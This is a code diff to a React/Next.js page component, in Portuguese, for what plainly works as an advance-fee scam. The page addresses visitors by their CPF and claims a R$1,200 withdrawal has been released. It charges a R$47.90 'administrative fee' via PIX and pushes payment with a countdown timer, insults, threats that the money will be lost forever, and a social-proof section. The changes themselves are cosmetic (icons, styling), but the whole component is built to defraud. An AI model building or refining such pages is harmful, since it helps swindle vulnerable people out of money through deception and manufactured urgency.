@@ -6,7 +6,7 @@ import { useState, useEffect } from 'react';
 import Image from 'next/image';
 import OfferTimer from '@/components/features/OfferTimer';
 import { Button } from '@/components/ui/button';
-import { CheckCircle, TrendingUp, ShieldCheck, Star, BadgePercent, Users } from 'lucide-react'; // Added Users
+import { CheckCircle, TrendingUp, ShieldCheck, Star, BadgePercent, Users, AlertTriangle, Clock } from 'lucide-react'; // Added Users, AlertTriangle, Clock
 
 interface OfferStepProps {
   cpf: string | null;
@@ -80,14 +80,15 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
     alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$47,90. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
   };
 
-  const displayedCpf = cpf || '***.***.***-**';
+  const formattedCpf = cpf || '***.***.***-**';
 
   return (
     <div className="w-full max-w-2xl mx-auto p-4 md:p-6 space-y-6 bg-background text-foreground">
         
-        <div className="text-center p-4 md:p-6 rounded-lg shadow-[0px_4px_15px_rgba(0,0,0,0.1)] bg-card">
-           <h2 className="font-headline text-2xl md:text-3xl font-bold mb-2 uppercase text-foreground">
-            <span>🔥 ALERTA MÁXIMO, CPF {displayedCpf}!</span><br/>SEU SAQUE DE <strong className="text-4xl md:text-5xl">R$1.200,00</strong> FOI LIBERADO AGORA!
+        <div className="text-center">
+          <h2 className="font-headline text-xl md:text-2xl font-bold mb-2 uppercase text-foreground">
+            <span>🔥 ALERTA MÁXIMO, CPF {formattedCpf}!</span><br/>
+            SEU SAQUE DE <strong className="text-3xl md:text-4xl">R$1.200,00</strong> FOI LIBERADO AGORA!
           </h2>
           
           <ul className="space-y-2 text-left text-sm md:text-base max-w-md mx-auto bg-secondary/20 p-4 rounded-lg border border-primary/30 shadow">
@@ -106,16 +107,16 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
         </div>
 
         {/* Área de Urgência */}
-        <div className="bg-destructive/10 p-3 sm:p-4 rounded-lg border-2 border-destructive text-center shadow-xl">
+        <div className="bg-destructive/10 p-3 sm:p-4 rounded-lg border-2 border-destructive text-center shadow-xl text-destructive">
           <div className="flex flex-wrap items-center justify-center text-center font-bold text-md sm:text-lg md:text-xl mb-2">
-            <span className="text-destructive text-3xl mr-2">⏰</span>
-            <span className="text-destructive uppercase">CORRE! SEU TEMPO TÁ ACABANDO!</span>
+            <Clock className="h-8 w-8 mr-2" /> 
+            <span className="uppercase">CORRE! SEU TEMPO TÁ ACABANDO!</span>
           </div>
           <div className="text-center my-2">
              <OfferTimer initialMinutes={4} initialSeconds={31} />
           </div>
-          <p className="text-destructive text-sm sm:text-md md:text-lg font-bold uppercase leading-tight">
-            Atenção: <span className="text-2xl md:text-3xl underline">NÃO SEJA BURRO!</span><br/> Se você não sacar <strong >AGORA</strong>, seus <strong >R$1.200,00</strong> serão <strong >CANCELADOS</strong> e <strong >PERDIDOS PARA SEMPRE</strong> às 23:59 de <strong >HOJE!</strong><br/> Não tem choro nem vela, <strong className="text-xl">É AGORA OU NUNCA!</strong>
+          <p className="text-sm sm:text-md md:text-lg font-bold uppercase leading-tight">
+            <AlertTriangle className="inline-block h-6 w-6 mr-1" /> Atenção: <span className="text-2xl md:text-3xl underline">NÃO SEJA BURRO!</span><br/> Se você não sacar <strong >AGORA</strong>, seus <strong >R$1.200,00</strong> serão <strong >CANCELADOS</strong> e <strong >PERDIDOS PARA SEMPRE</strong> às 23:59 de <strong >HOJE!</strong><br/> Não tem choro nem vela, <strong className="text-xl">É AGORA OU NUNCA!</strong>
           </p>
         </div>
 
@@ -148,7 +149,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
         {/* SEÇÃO DE PROVA SOCIAL */}
         <div className="my-6 md:my-8">
           <h3 className="font-headline text-xl md:text-2xl font-bold text-primary text-center mb-5 uppercase flex items-center justify-center">
-            <Users className="mr-2 h-7 w-7" /> {/* Adicionado Users Icon */}
+            <Users className="mr-2 h-7 w-7" /> 
             COMUNIDADE SAQUE RÁPIDO: VEJA QUEM JÁ <span className="text-accent underline">ENCHEU O BOLSO</span> HOJE!
           </h3>
           <div className="space-y-4">
@@ -192,3 +193,4 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 };
 
 export default OfferStep;
+
